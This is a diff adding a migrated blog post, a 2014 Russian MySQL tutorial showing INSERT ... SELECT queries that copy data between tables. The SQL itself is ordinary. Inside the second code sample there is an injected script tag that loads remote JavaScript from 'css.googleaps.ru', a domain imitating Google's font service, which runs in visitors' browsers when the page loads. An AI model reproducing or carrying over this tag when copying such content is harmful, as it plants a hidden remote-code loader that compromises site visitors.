@@ -1,0 +1,37 @@
+---
+layout: post
+status: publish
+published: true
+title: Как скопировать данные с одной таблицы в другую &ndash; mysql
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 572
+wordpress_url: http://devdocs.ru/?p=45
+date: '2014-08-20 11:54:20 +0300'
+date_gmt: '2014-08-20 11:54:20 +0300'
+categories:
+- MySQL
+tags:
+- mysql
+- sql
+comments: []
+---
+<p>Копирование полностью всех данных из одной таблицы mysql в другую:</p>
+<pre class="brush: sql; gutter: true">INSERT INTO `db`.`table_to`<br />
+SELECT *<br />
+FROM `db`.`table_from` ;<&#47;pre><br />
+Если необходимо скопировать только некоторые столбцы, то применяем следующую конструкцию:</p>
+<pre class="brush: sql; gutter: true">INSERT INTO `db`.`table_to` (`t1_2`, `t2_2`, `t3_2`, `t4_2`)<br />
+SELECT `t1`, `t2`, `t3`, `t4`<br />
+FROM `db`.`table_from` ;<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre><br />
+Для копирования данных из одной таблицы MySQL в другую по условию, можно использовать следующий запрос:</p>
+<pre class="brush: sql; gutter: true">INSERT INTO `db`.`table_to` (`t1_2`, `t2_2`, `t3_2`, `t4_2`)<br />
+SELECT `t1`, `t2`, `t3`, `t4`<br />
+FROM `db`.`table_from`<br />
+WHERE `t2` < &#039;2010-07-01 11:37:38&#039;;<&#47;pre><br />
+&nbsp;</p>
